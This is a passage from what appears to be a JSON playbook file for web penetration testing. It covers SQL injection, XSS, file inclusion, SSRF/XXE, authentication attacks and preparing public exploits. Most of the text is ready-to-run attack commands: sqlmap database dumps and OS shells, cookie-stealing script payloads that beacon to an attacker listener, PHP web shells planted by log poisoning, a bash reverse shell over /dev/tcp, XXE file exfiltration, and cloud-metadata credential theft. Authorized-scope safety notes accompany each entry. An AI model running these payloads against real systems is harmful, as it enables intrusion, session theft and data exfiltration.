      "cmd": "gobuster dir -u <URL> -w <WORDLIST> -x php,html,bak -t 50 -o gobuster.txt"
     },
     {
      "do": "Hunt for exposed git/env/backup artifacts specifically",
      "cmd": "ffuf -u <URL>/FUZZ -w <WORDLIST> -mc 200 -fs 0 -e .git/HEAD,.env,.DS_Store,config.php.bak"
     }
    ]
   },
   {
    "name": "Virtual host & parameter discovery",
    "steps": [
     {
      "do": "Discover virtual hosts by fuzzing the Host header",
      "cmd": "ffuf -u <URL> -H 'Host: FUZZ.<DOMAIN>' -w <WORDLIST> -ac -mc 200,301,302 -o vhosts.json",
      "note": "Filter by response size with -fs once you know the default page length."
     },
     {
      "do": "Brute force hidden GET parameters on a target endpoint with arjun",
      "cmd": "arjun -u <URL>/<PARAM> -m GET -oT arjun-params.txt",
      "note": "Switch -m to POST or JSON to match the endpoint's content type."
     },
     {
      "do": "Fuzz a suspected parameter name to find reflected/accepted values",
      "cmd": "ffuf -u '<URL>/?FUZZ=test' -w <WORDLIST> -ac -fs 0"
     }
    ]
   },
   {
    "name": "Baseline vulnerability sweep",
    "steps": [
     {
      "do": "Run a low-noise nuclei baseline across discovered hosts",
      "cmd": "nuclei -l httpx.txt -t http/ -severity low,medium,high,critical -rl 50 -o nuclei-baseline.txt",
      "note": "-rl rate-limits to 50 req/s to stay gentle on the target."
     },
     {
      "do": "Check for known exposures and misconfigurations",
      "cmd": "nuclei -u <URL> -t http/exposures/ -t http/misconfiguration/ -o nuclei-exposures.txt"
     },
     {
      "do": "Re-run nuclei against newly found endpoints from discovery",
      "cmd": "cat ffuf-dirs.json | jq -r '.results[].url' | nuclei -t http/vulnerabilities/ -o nuclei-endpoints.txt"
     }
    ]
   }
  ],
  "verify": "Cross-reference httpx tech output, whatweb plugins, and nuclei findings to confirm the stack and that discovered paths return non-soft-404 responses.",
  "cleanup": "Remove local scan artifacts (httpx.txt, ffuf-dirs.json, nuclei-*.txt) if the engagement requires clean handling of enumeration data.",
  "safety": "Only scan hosts and parameters explicitly listed in your authorized scope and respect agreed rate limits."
 },
 {
  "id": "web-sql-injection",
  "title": "SQL Injection",
  "cat": "Web",
  "goal": "Detect, confirm, and exploit SQL injection to extract data or gain command execution on an authorized target.",
  "when": "When a parameter, header, or body field appears to interact with a backend database.",
  "risk": "high",
  "tools": [
   "sqlmap",
   "curl",
   "ffuf"
  ],
  "mitre": [
   "T1190 Exploit Public-Facing Application",
   "T1505 Server Software Component",
   "T1005 Data from Local System",
   "T1059 Command and Scripting Interpreter"
  ],
  "phases": [
   {
    "name": "Manual detection",
    "steps": [
     {
      "do": "Break the query with a single quote and watch for an error or state change",
      "cmd": "curl -sS '<URL>?<PARAM>=1%27' | grep -iE 'sql|syntax|mysql|ora-|odbc|warning'",
      "note": "A 500, SQL error, or altered page often signals injectable input."
     },
     {
      "do": "Test boolean-based inference with true vs false conditions",
      "cmd": "curl -sS \"<URL>?<PARAM>=1' AND '1'='1\"; curl -sS \"<URL>?<PARAM>=1' AND '1'='2\"",
      "note": "Different responses between the two confirm boolean-based blind SQLi."
     },
     {
      "do": "Time-based test to confirm blind injection when output is identical",
      "cmd": "curl -sS -o /dev/null -w '%{time_total}\\n' \"<URL>?<PARAM>=1' AND SLEEP(5)-- -\"",
      "note": "A ~5s delay confirms time-based blind on MySQL; use WAITFOR DELAY for MSSQL."
     }
    ]
   },
   {
    "name": "Column mapping & UNION",
    "steps": [
     {
      "do": "Find the column count with ORDER BY until it errors",
      "cmd": "for i in 1 2 3 4 5 6 7 8; do echo -n \"$i: \"; curl -sS -o /dev/null -w '%{http_code}\\n' \"<URL>?<PARAM>=1' ORDER BY $i-- -\"; done",
      "note": "The first index that errors means the real count is one less."
     },
     {
      "do": "Identify reflected columns via a UNION SELECT of markers",
      "cmd": "curl -sS \"<URL>?<PARAM>=-1' UNION SELECT 1,2,3,4-- -\"",
      "note": "Note which numbers echo on the page; those positions carry extracted data."
     },
     {
      "do": "Pull database version and current user through a reflected column",
      "cmd": "curl -sS \"<URL>?<PARAM>=-1' UNION SELECT 1,version(),current_user(),4-- -\""
     },
     {
      "do": "Enumerate tables from information_schema in a reflected column",
      "cmd": "curl -sS \"<URL>?<PARAM>=-1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -\""
     }
    ]
   },
   {
    "name": "Automate with sqlmap",
    "steps": [
     {
      "do": "Confirm the injection and enumerate databases automatically",
      "cmd": "sqlmap -u '<URL>?<PARAM>=1' --batch --level=3 --risk=2 --dbs",
      "note": "--batch accepts defaults; raise level/risk only on authorized, robust targets."
     },
     {
      "do": "Enumerate tables within the target database",
      "cmd": "sqlmap -u '<URL>?<PARAM>=1' --batch -D <TARGET> --tables"
     },
     {
      "do": "Dump sensitive columns from a chosen table",
      "cmd": "sqlmap -u '<URL>?<PARAM>=1' --batch -D <TARGET> -T users -C username,password --dump",
      "note": "Scope the dump to needed columns; avoid mass-exfiltrating live PII."
     },
     {
      "do": "Replay an authenticated request from a saved Burp file",
      "cmd": "sqlmap -r request.txt --batch -p <PARAM> --dbs",
      "note": "Saving the raw request preserves cookies, headers, and POST body exactly."
     }
    ]
   },
   {
    "name": "Authentication bypass",
    "steps": [
     {
      "do": "Attempt the canonical login bypass payload in the username field",
      "cmd": "curl -sS -i -X POST <URL>/login -d \"username=admin'-- -&password=x\"",
      "note": "Comment syntax truncates the password check; textbook auth bypass."
     },
     {
      "do": "Try the always-true tautology if comments are filtered",
      "cmd": "curl -sS -i -X POST <URL>/login -d \"username=' OR 1=1-- -&password=x\"",
      "note": "' OR 1=1-- is the classic tautology that matches the first user row."
     },
     {
      "do": "Let sqlmap validate the login form fields directly",
      "cmd": "sqlmap -u <URL>/login --data='username=admin&password=x' --batch -p username"
     }
    ]
   },
   {
    "name": "Escalate & WAF evasion",
    "steps": [
     {
      "do": "Attempt an interactive OS shell when stacked queries/file write is possible",
      "cmd": "sqlmap -u '<URL>?<PARAM>=1' --batch --os-shell",
      "note": "Requires DBA privileges and a writable web root; often blocked in hardened setups."
     },
     {
      "do": "Read a server-side file via the DBMS file primitive",
      "cmd": "sqlmap -u '<URL>?<PARAM>=1' --batch --file-read=/etc/passwd"
     },
     {
      "do": "Apply tamper scripts to slip past a basic WAF",
      "cmd": "sqlmap -u '<URL>?<PARAM>=1' --batch --tamper=space2comment,between,charencode --random-agent",
      "note": "Chain tampers that match the backend; test incrementally to see what the WAF drops."
     },
     {
      "do": "Fuzz for parameters that reach the database using injection markers",
      "cmd": "ffuf -u '<URL>?FUZZ=1%27' -w <WORDLIST> -mr 'SQL|syntax|mysql|warning' -o sqli-params.json"
     }
    ]
   }
  ],
  "verify": "Confirm injection by reproducible boolean/time differentials or extracted version/table data that matches the application's expected schema.",
  "cleanup": "Delete any files written by --os-shell or --file-write, drop staged tables sqlmap created, and remove local dumps containing sensitive data.",
  "safety": "Only inject into parameters within your signed scope and avoid --dump of live production PII unless explicitly authorized."
 },
 {
  "id": "web-cross-site-scripting",
  "title": "Cross-Site Scripting (XSS)",
  "cat": "Web",
  "goal": "Find and exploit reflected, stored, and DOM-based XSS to execute attacker-controlled script in a victim's browser.",
  "when": "When user input is reflected into HTML, attributes, JavaScript, or the DOM without proper encoding.",
  "risk": "medium",
  "tools": [
   "dalfox",
   "XSStrike",
   "curl",
   "python3 http.server"
  ],
  "mitre": [
   "T1190 Exploit Public-Facing Application",
   "T1059 Command and Scripting Interpreter",
   "T1539 Steal Web Session Cookie",
   "T1557 Adversary-in-the-Middle"
  ],
  "phases": [
   {
    "name": "Reflection detection",
    "steps": [
     {
      "do": "Inject a unique canary and check whether it reflects unencoded",
      "cmd": "curl -sS '<URL>?<PARAM>=dnxss9z<>\"' | grep -n 'dnxss9z'",
      "note": "If < > \" survive unescaped, the context is likely injectable."
     },
     {
      "do": "Fire the canonical reflected payload and look for raw script tags",
      "cmd": "curl -sS '<URL>?<PARAM>=<script>alert(1)</script>' | grep -o '<script>alert(1)</script>'",
      "note": "<script>alert(1)</script> is the textbook proof-of-concept."
     },
     {
      "do": "Scan the parameter automatically with dalfox",
      "cmd": "dalfox url '<URL>?<PARAM>=1' --mining-dom --deep-domxss -o dalfox.txt",
      "note": "dalfox parameter-mines, injects, and verifies with a headless browser."
     }
    ]
   },
   {
    "name": "Context-aware payloads",
    "steps": [
     {
      "do": "Break out of an HTML attribute context",
      "cmd": "curl -sS \"<URL>?<PARAM>=%22%3E%3Cscript%3Ealert(1)%3C/script%3E\"",
      "note": "\"> closes the attribute and tag before injecting the script element."
     },
     {
      "do": "Inject inside an existing JavaScript string context",
      "cmd": "curl -sS \"<URL>?<PARAM>=';alert(1);//\"",
      "note": "Terminate the string and statement, then comment out the trailing code."
     },
     {
      "do": "Use an event-handler payload when script tags are stripped",
      "cmd": "curl -sS '<URL>?<PARAM>=<img src=x onerror=alert(1)>'",
      "note": "onerror fires without a <script> tag, bypassing naive tag blacklists."
     },
     {
      "do": "Deploy a polyglot that survives multiple contexts",
      "cmd": "curl -sS '<URL>?<PARAM>=jaVasCript:/*-/*`/*\\`/*'\\''/*\"/**/(/* */onerror=alert(1) )//'",
      "note": "A single polyglot exercises attribute, script, and URI contexts at once."
     }
    ]
   },
   {
    "name": "Filter bypass & DOM analysis",
    "steps": [
     {
      "do": "Run XSStrike for intelligent payload generation and WAF fingerprinting",
      "cmd": "python3 XSStrike/xsstrike.py -u '<URL>?<PARAM>=1' --fuzzer",
      "note": "XSStrike analyzes the reflection context and tunes payloads to the filter."
     },
     {
      "do": "Test case and encoding mutations to slip past blacklists",
      "cmd": "curl -sS '<URL>?<PARAM>=<ScRiPt>alert(1)</ScRiPt>'; curl -sS '<URL>?<PARAM>=%3Cscript%3Ealert%281%29%3C/script%3E'"
     },
     {
      "do": "Probe for DOM XSS sinks in client-side code with dalfox DOM mode",
      "cmd": "dalfox url '<URL>' --deep-domxss --silence",
      "note": "Look for document.write, innerHTML, eval, and location.hash sinks."
     }
    ]
   },
   {
    "name": "Exfiltration via listener",
    "steps": [
     {
      "do": "Start a simple HTTP listener to catch callbacks",
      "cmd": "python3 -m http.server 8000",
      "note": "Run on $LHOST; every XSS callback shows up in the request log."
     },
     {
      "do": "Use a fetch-based beacon payload to exfiltrate data",
      "cmd": "curl -sS \"<URL>?<PARAM>=<script>fetch('http://$LHOST:8000/x?c='+document.cookie)</script>\"",
      "note": "The callback query string carries the stolen value to your listener."
     },
     {
      "do": "Fall back to an image beacon where fetch/CSP is restricted",
      "cmd": "curl -sS \"<URL>?<PARAM>=<img src=x onerror=\\\"this.src='http://$LHOST:8000/i?d='+document.domain\\\">\""
     }
    ]
   },
   {
    "name": "Session theft PoC",
    "steps": [
     {
      "do": "Craft a stored payload that beacons the session cookie",
      "cmd": "curl -sS -X POST <URL>/comment -d \"body=<script>new Image().src='http://$LHOST:8000/s?k='+encodeURIComponent(document.cookie)</script>\"",
      "note": "Only test against accounts you own or are authorized to compromise."
     },
     {
      "do": "Confirm the captured cookie arrived at your listener log",
      "cmd": "curl -sS 'http://$LHOST:8000/' >/dev/null; echo 'check the http.server stdout for /s?k=' ",
      "note": "The cookie appears URL-encoded in the server's request log line."
     },
     {
      "do": "Validate the stolen session by replaying the cookie",
      "cmd": "curl -sS -b '<COOKIE>' <URL>/account | grep -i 'logged in as'"
     }
    ]
   }
  ],
  "verify": "Confirm script execution via an alert/console side effect or a received callback in your listener log, mapped to the exact injection context.",
  "cleanup": "Delete any stored XSS payloads from comments/profiles, stop the http.server listener, and discard captured cookies after reporting.",
  "safety": "Only inject into in-scope parameters and only steal sessions of test accounts you own or are explicitly authorized to target."
 },
 {
  "id": "web-file-inclusion-path-traversal",
  "title": "File Inclusion & Path Traversal (LFI/RFI)",
  "cat": "Web",
  "goal": "Read arbitrary server files and escalate local/remote file inclusion to remote code execution.",
  "when": "When a parameter appears to load a file, template, page, or language resource by name or path.",
  "risk": "high",
  "tools": [
   "ffuf",
   "curl",
   "LFISuite-style manual",
   "python3"
  ],
  "mitre": [
   "T1190 Exploit Public-Facing Application",
   "T1083 File and Directory Discovery",
   "T1005 Data from Local System",
   "T1059 Command and Scripting Interpreter"
  ],
  "phases": [
   {
    "name": "Traversal detection",
    "steps": [
     {
      "do": "Attempt a canonical traversal to read /etc/passwd",
      "cmd": "curl -sS '<URL>?<PARAM>=../../../../etc/passwd' | grep -m1 'root:'",
      "note": "../../../../etc/passwd is the textbook Linux traversal target."
     },
     {
      "do": "Test null byte and extension tricks on older PHP stacks",
      "cmd": "curl -sS '<URL>?<PARAM>=../../../../etc/passwd%00'; curl -sS '<URL>?<PARAM>=....//....//etc/passwd'",
      "note": "....// defeats naive single-pass ../ stripping; %00 helps on PHP < 5.3.4."
     },
     {
      "do": "Probe a Windows host for a known file",
      "cmd": "curl -sS '<URL>?<PARAM>=..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini'"
     }
    ]
   },
   {
    "name": "LFI wordlist fuzzing",
    "steps": [
     {
      "do": "Fuzz LFI paths with a traversal wordlist and match on content",
      "cmd": "ffuf -u '<URL>?<PARAM>=FUZZ' -w <WORDLIST> -mr 'root:.*:0:0:' -o lfi-hits.json",
      "note": "SecLists LFI-Jhaddix.txt is a strong wordlist for this fuzz."
     },
     {
      "do": "Enumerate interesting system and app config files",
      "cmd": "ffuf -u '<URL>?<PARAM>=../../../../FUZZ' -w <WORDLIST> -mc 200 -fs 0",
      "note": "Target /etc/apache2/apache2.conf, app configs, and credential files."
     },
     {
      "do": "Auto-detect traversal depth that reaches the file system root",
      "cmd": "for d in 1 2 3 4 5 6 7 8; do p=$(printf '../%.0s' $(seq $d)); echo -n \"$d: \"; curl -sS \"<URL>?<PARAM>=${p}etc/passwd\" | grep -c 'root:'; done"
     }
    ]
   },
   {
    "name": "PHP wrappers",
    "steps": [
     {
      "do": "Base64-encode PHP source via php://filter to leak code",
      "cmd": "curl -sS '<URL>?<PARAM>=php://filter/convert.base64-encode/resource=index.php' | tail -1 | base64 -d",
      "note": "The filter dumps source without executing it; review for secrets and more sinks."
     },
     {
      "do": "Execute code through the data:// wrapper if allow_url_include is on",
      "cmd": "curl -sS \"<URL>?<PARAM>=data://text/plain;base64,$(echo -n '<?php system($_GET[0]); ?>' | base64)&0=id\"",
      "note": "data:// inlines a PHP payload; 0=id passes the command through the GET param."
     },
     {
      "do": "Use php://input to post executable PHP into the include",
      "cmd": "curl -sS '<URL>?<PARAM>=php://input' --data '<?php system(\"id\"); ?>'"
     }
    ]
   },
   {
    "name": "LFI to RCE via log poisoning",
    "steps": [
     {
      "do": "Poison the Apache access log via a malicious User-Agent",
      "cmd": "curl -sS <URL> -A '<?php system($_GET[\"c\"]); ?>'",
      "note": "The payload lands in the access log line for later inclusion."
     },
     {
      "do": "Include the poisoned log to trigger execution",
      "cmd": "curl -sS '<URL>?<PARAM>=../../../../var/log/apache2/access.log&c=id'",
      "note": "The included log executes the embedded PHP with your command."
     },
     {
      "do": "Try /proc/self/environ as an alternate poisoning vector",
      "cmd": "curl -sS '<URL>?<PARAM>=../../../../proc/self/environ&c=id' -A '<?php system($_GET[\"c\"]); ?>'"
     },
     {
      "do": "Attempt PHP session file poisoning when logs are unreadable",
      "cmd": "curl -sS '<URL>' -b 'PHPSESSID=dnx1' -d 'name=<?php system($_GET[\"c\"]); ?>'; curl -sS '<URL>?<PARAM>=../../../../var/lib/php/sessions/sess_dnx1&c=id'"
     }
    ]
   },
   {
    "name": "RFI with hosted payload",
    "steps": [
     {
      "do": "Host a PHP payload from your attack box",
      "cmd": "echo '<?php system($_GET[\"c\"]); ?>' > shell.php && python3 -m http.server 8000",
      "note": "Serve from $LHOST:8000; RFI requires allow_url_include=On."
     },
     {
      "do": "Include the remote payload and run a command",
      "cmd": "curl -sS 'http://<TARGET>/?<PARAM>=http://$LHOST:8000/shell.php&c=id'",
      "note": "A null-byte or ? can bypass an appended extension on legacy stacks."
     },
     {
      "do": "Upgrade the command execution to an interactive reverse shell",
      "cmd": "curl -sS \"http://<TARGET>/?<PARAM>=http://$LHOST:8000/shell.php&c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'\"",
      "note": "Start 'nc -lvnp 4444' on $LHOST first to catch the shell."
     }
    ]
   }
  ],
  "verify": "Confirm inclusion by retrieving a known file's contents (root: in /etc/passwd) and RCE by the output of 'id' returning in the response.",
  "cleanup": "Remove uploaded/poisoned session files, stop the http.server, delete shell.php, and note any log entries you poisoned for the report.",
  "safety": "Only read files and achieve execution on hosts within your authorized scope; avoid exfiltrating unrelated sensitive data."
 },
 {
  "id": "web-ssrf-xxe",
  "title": "SSRF & XXE",
  "cat": "Web",
  "goal": "Abuse server-side request forgery and XML external entities to reach internal services, cloud metadata, and read files.",
  "when": "When the app fetches URLs server-side or parses XML/SVG/SAML/DOCX input.",
  "risk": "high",
  "tools": [
   "interactsh-client",
   "curl",
   "Burp (note)",
   "python3"
  ],
  "mitre": [
   "T1190 Exploit Public-Facing Application",
   "T1071 Application Layer Protocol",
   "T1552 Unsecured Credentials",
   "T1005 Data from Local System"
  ],
  "phases": [
   {
    "name": "SSRF detection",
    "steps": [
     {
      "do": "Start an OOB listener to catch blind server-side requests",
      "cmd": "interactsh-client -v",
      "note": "Note the generated .oast domain; any callback proves the server made the request."
     },
     {
      "do": "Point a URL parameter at your OOB domain and watch for a hit",
      "cmd": "curl -sS '<URL>?url=http://<DOMAIN>.oast.pro/ssrf'",
      "note": "A DNS/HTTP interaction in interactsh confirms blind SSRF."
     },
     {
      "do": "Probe internal ranges and loopback for reachable services",
      "cmd": "for h in 127.0.0.1 169.254.169.254 10.0.0.1 192.168.0.1; do echo -n \"$h: \"; curl -sS -o /dev/null -w '%{http_code}\\n' \"<URL>?url=http://$h/\"; done",
      "note": "Differing status/size for internal IPs reveals reachable internal hosts."
     }
    ]
   },
   {
    "name": "Cloud metadata & internal reach",
    "steps": [
     {
      "do": "Hit the AWS IMDS endpoint for instance metadata",
      "cmd": "curl -sS '<URL>?url=http://169.254.169.254/latest/meta-data/'",
      "note": "169.254.169.254 is the canonical cloud metadata address."
     },
     {
      "do": "Pull IAM credentials via the metadata role path (IMDSv1)",
      "cmd": "curl -sS '<URL>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
      "note": "Then request the named role to retrieve temporary AccessKey/Secret/Token."
     },
     {
      "do": "Query GCP metadata, which requires a specific header",
      "cmd": "curl -sS '<URL>?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'",
      "note": "If the app forwards headers, GCP's required Metadata-Flavor header is reachable."
     }
    ]
   },
   {
    "name": "SSRF filter bypass",
    "steps": [
     {
      "do": "Encode and obfuscate the internal IP to defeat blacklists",
      "cmd": "curl -sS '<URL>?url=http://0x7f000001/'; curl -sS '<URL>?url=http://2130706433/'; curl -sS '<URL>?url=http://127.1/'",
      "note": "Hex, decimal, and short-form loopback all resolve to 127.0.0.1."
     },
     {
      "do": "Use an open redirect or attacker DNS to bypass allowlists",
      "cmd": "curl -sS '<URL>?url=http://<DOMAIN>.oast.pro@trusted-host.com/'; curl -sS '<URL>?url=http://trusted-host.com.<DOMAIN>.oast.pro/'",
      "note": "The @ trick and suffix confusion exploit lax host parsing."
     },
     {
      "do": "Try the gopher scheme to craft raw requests to internal TCP services",
      "cmd": "curl -sS '<URL>?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A'",
      "note": "gopher:// can smuggle arbitrary bytes to Redis/SMTP when the fetcher supports it."
     }
    ]
   },
   {
    "name": "XXE classic file read",
    "steps": [
     {
      "do": "Submit an entity that reads a local file into a reflected node",
      "cmd": "curl -sS -X POST <URL> -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r><name>&xxe;</name></r>'",
      "note": "The &xxe; entity expands to the file contents in the echoed response."
     },
     {
      "do": "Use the PHP base64 filter to read source or binary-ish files",
      "cmd": "curl -sS -X POST <URL> -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r><name>&xxe;</name></r>'"
     },
     {
      "do": "Pivot XXE into SSRF by fetching an internal/OOB URL",
      "cmd": "curl -sS -X POST <URL> -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r><name>&xxe;</name></r>'"
     }
    ]
   },
   {
    "name": "Blind XXE via external DTD",
    "steps": [
     {
      "do": "Host a malicious external DTD that exfiltrates a file",
      "cmd": "printf '%s' '<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM '\\''http://$LHOST:8000/?x=%file;'\\''>\">%eval;%exfil;' > evil.dtd && python3 -m http.server 8000",
      "note": "Parameter entities are required because general entities cannot be used in the DTD subset this way."
     },
     {
      "do": "Send an XML payload that pulls and triggers the remote DTD",
      "cmd": "curl -sS -X POST <URL> -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % dtd SYSTEM \"http://$LHOST:8000/evil.dtd\">%dtd;]><r>1</r>'",
      "note": "Use for fully blind parsers where no entity is reflected back."
     },
     {
      "do": "Read the exfiltrated base64 from your listener log and decode it",
      "cmd": "echo 'copy the x= value from the http.server log, then:' ; echo '<BASE64FROMLOG>' | base64 -d",
      "note": "The leaked file content arrives URL/base64-encoded in the ?x= parameter."
     }
    ]
   }
  ],
  "verify": "Confirm SSRF by an interactsh callback or internal metadata contents returning, and XXE by file contents appearing in the response or your OOB listener.",
  "cleanup": "Stop the http.server and interactsh-client, remove evil.dtd, and discard any retrieved cloud credentials after reporting.",
  "safety": "Only pivot to internal hosts and metadata endpoints belonging to the authorized target environment and never reuse leaked cloud keys."
 },
 {
  "id": "web-authentication-session-access-control",
  "title": "Authentication, Session & Access Control",
  "cat": "Web",
  "goal": "Break authentication, session handling, and authorization to gain or escalate access on an authorized application.",
  "when": "When testing login flows, token handling, session lifecycle, or object-level authorization.",
  "risk": "high",
  "tools": [
   "hydra",
   "ffuf",
   "jwt_tool",
   "hashcat",
   "curl"
  ],
  "mitre": [
   "T1110 Brute Force",
   "T1078 Valid Accounts",
   "T1212 Exploitation for Credential Access",
   "T1548 Abuse Elevation Control Mechanism",
   "T1550 Use Alternate Authentication Material"
  ],
  "phases": [
   {
    "name": "Default & brute-force creds",
    "steps": [
     {
      "do": "Try common default credential pairs first",
      "cmd": "for p in admin:admin admin:password root:toor admin:changeme; do u=${p%%:*}; w=${p##*:}; curl -sS -o /dev/null -w \"$p %{http_code}\\n\" -d \"username=$u&password=$w\" <URL>/login; done",
      "note": "Default creds are the fastest win and generate little noise."
     },
     {
      "do": "Brute force an HTTP POST login form with hydra",
      "cmd": "hydra -l <USER> -P <WORDLIST> <TARGET> http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials'",
      "note": "Set the F= string to a phrase present only on failed logins."
     },
     {
      "do": "Credential-stuff with ffuf when you need custom matching/throttling",
      "cmd": "ffuf -u <URL>/login -X POST -d 'username=<USER>&password=FUZZ' -w <WORDLIST> -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Invalid credentials' -rate 10",
      "note": "-fr filters the failure phrase; -rate throttles to avoid lockout."
     }
    ]
   },
   {
    "name": "JWT attacks",
    "steps": [
     {
      "do": "Decode and inspect the token's header and claims",
      "cmd": "jwt_tool <COOKIE>",
      "note": "Check alg, kid, exp, and any role/admin claims worth tampering."
     },
     {
      "do": "Forge a token using the alg:none / signature-strip bypass",
      "cmd": "jwt_tool <COOKIE> -X a",
      "note": "-X a tries algorithm-confusion/none attacks that drop signature verification."
     },
     {
      "do": "Crack a weak HMAC secret offline with hashcat",
      "cmd": "hashcat -m 16500 jwt.txt <WORDLIST>",
      "note": "Mode 16500 is JWT; put the full token on one line in jwt.txt."
     },
     {
      "do": "Re-sign a tampered admin claim with the cracked secret",
      "cmd": "jwt_tool <COOKIE> -S hs256 -p 'cracked_secret' -I -pc role -pv admin",
      "note": "Replay the forged token to test privilege escalation."
     }
    ]
   },
   {
    "name": "IDOR / BOLA enumeration",
    "steps": [
     {
      "do": "Enumerate sequential object IDs with your own session",
      "cmd": "ffuf -u '<URL>/api/account/FUZZ' -w <WORDLIST> -H 'Cookie: <COOKIE>' -mc 200 -o idor.json",
      "note": "A wordlist of 1..N IDs; 200s on IDs you do not own prove BOLA."
     },
     {
      "do": "Compare a low-privilege user's access to another user's resource",
      "cmd": "curl -sS -H 'Cookie: <COOKIE>' <URL>/api/account/1337 | head",
      "note": "Returning another user's data with your cookie confirms IDOR."
     },
     {
      "do": "Test for mass-assignment / role tampering on a profile update",
      "cmd": "curl -sS -X PUT <URL>/api/account/me -H 'Cookie: <COOKIE>' -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'",
      "note": "If the server honors an unexpected role field, authorization is broken."
     }
    ]
   },
   {
    "name": "Session & reset flaws",
    "steps": [
     {
      "do": "Check whether the session ID rotates after authentication",
      "cmd": "curl -sS -i -c jar.txt <URL>/login -d 'username=<USER>&password=<PARAM>' | grep -i set-cookie; curl -sS -i -b jar.txt <URL>/ | grep -i set-cookie",
      "note": "A session ID unchanged across login indicates session fixation."
     },
     {
      "do": "Inspect cookie attributes for missing hardening flags",
      "cmd": "curl -sS -I <URL>/ | grep -i set-cookie",
      "note": "Flag any session cookie missing HttpOnly, Secure, or SameSite."
     },
     {
      "do": "Test host-header poisoning of the password reset link",
      "cmd": "curl -sS -X POST <URL>/reset -H 'Host: $LHOST' -d 'email=<USER>'",
      "note": "If the reset email uses the Host header, the token link points to your server."
     },
     {
      "do": "Probe reset-token predictability or reuse",
      "cmd": "curl -sS '<URL>/reset?token=0000000000000000'; curl -sS '<URL>/reset?token=0000000000000001'",
      "note": "Sequential/short tokens or accepted-after-use tokens indicate a reset flaw."
     }
    ]
   },
   {
    "name": "2FA bypass patterns",
    "steps": [
     {
      "do": "Check whether privileged endpoints are reachable before the 2FA step",
      "cmd": "curl -sS -H 'Cookie: <COOKIE>' <URL>/account/dashboard -o /dev/null -w '%{http_code}\\n'",
      "note": "A 200 on protected pages pre-2FA means the second factor is not enforced server-side."
     },
     {
      "do": "Attempt to brute force a short OTP with throttle-aware fuzzing",
      "cmd": "ffuf -u <URL>/2fa/verify -X POST -d 'code=FUZZ' -w <WORDLIST> -H 'Cookie: <COOKIE>' -mc 302 -rate 5",
      "note": "Use a 0000-9999 numeric list; missing rate-limit/lockout enables OTP brute force."
     },
     {
      "do": "Test response/flag tampering on the verification result",
      "cmd": "curl -sS -i -X POST <URL>/2fa/verify -H 'Cookie: <COOKIE>' -d 'code=000000' | grep -iE 'location|set-cookie'",
      "note": "Replaying a success response or flipping a status flag can skip the factor."
     }
    ]
   }
  ],
  "verify": "Confirm success by authenticating as a target account, accessing another user's object with your session, or reaching protected pages with a forged token.",
  "cleanup": "Invalidate forged tokens, revert any role/profile fields you changed, and remove local credential, jar.txt, and jwt artifacts.",
  "safety": "Only brute force and escalate against accounts and endpoints explicitly in scope and respect lockout/rate-limit terms in the rules of engagement."
 },
 {
  "id": "finding-weaponizing-public-exploits",
  "title": "Finding & Weaponizing Public Exploits",
  "cat": "Exploitation",
  "goal": "Map discovered service versions to public exploits and safely prepare them for use.",
  "when": "After version enumeration reveals software with known vulnerabilities on an authorized host.",
  "risk": "high",
  "tools": [
   "searchsploit",
   "nuclei",
   "gcc",
   "git",
   "python3"
  ],
  "mitre": [
   "T1203 Exploitation for Client Execution",
   "T1210 Exploitation of Remote Services",
   "T1588.005 Exploits",
   "T1588.006 Vulnerabilities"
  ],
  "phases": [
   {
    "name": "Map versions to vulnerabilities",
    "steps": [
     {
      "do": "Search exploit-db by product and version",
      "cmd": "searchsploit 'vsftpd 2.3.4'"
     },
     {
      "do": "Update the local exploit database first",
      "cmd": "searchsploit -u"
     },
     {
      "do": "Pull nmap banner output into a bulk search",
      "cmd": "searchsploit --nmap scan.xml",
      "note": "Feed nmap -oX XML directly"
     }
    ]
   },
   {
    "name": "Examine before trusting",
    "steps": [
     {
      "do": "Read exploit metadata and preconditions",
      "cmd": "searchsploit -x 49757"
     },
     {
      "do": "Fetch upstream notes and CVE context",
      "cmd": "searchsploit --examine 49757"
     },
     {
      "do": "Copy the exploit into the working directory",
      "cmd": "searchsploit -m 49757"
     },
     {
      "do": "Audit the source for payloads and hardcoded hosts",
      "cmd": "grep -niE 'socket|connect|system|exec|0\\.0\\.0\\.0' 49757.py"
     }
    ]
   },
   {
    "name": "Confirm with a scanner",
    "steps": [
     {
      "do": "Run targeted nuclei CVE templates",
      "cmd": "nuclei -u http://<IP> -tags cve -severity high,critical"
     },
     {
      "do": "Check one specific CVE template",
      "cmd": "nuclei -u http://<IP> -id CVE-2021-41773"
     },
     {
      "do": "Clone a PoC repo for a specific CVE",
      "cmd": "git clone https://github.com/example/CVE-2021-41773-poc.git"
     }
    ]
   },
   {
    "name": "Compile and adjust",
    "steps": [
     {
      "do": "Compile a 64-bit C exploit",
      "cmd": "gcc 12345.c -o exploit"
     },
     {
      "do": "Compile a 32-bit exploit on a 64-bit host",
      "cmd": "gcc -m32 12345.c -o exploit32",
      "note": "Needs gcc-multilib installed"
     },
     {
      "do": "Edit LHOST/LPORT and target offsets in the source",
      "cmd": "sed -i 's/127.0.0.1/\\$LHOST/' exploit.py"
     },
     {
      "do": "Run a Python PoC against the target",
      "cmd": "python3 exploit.py <RHOST> $LHOST $LPORT"
     }
    ]
   },
   {
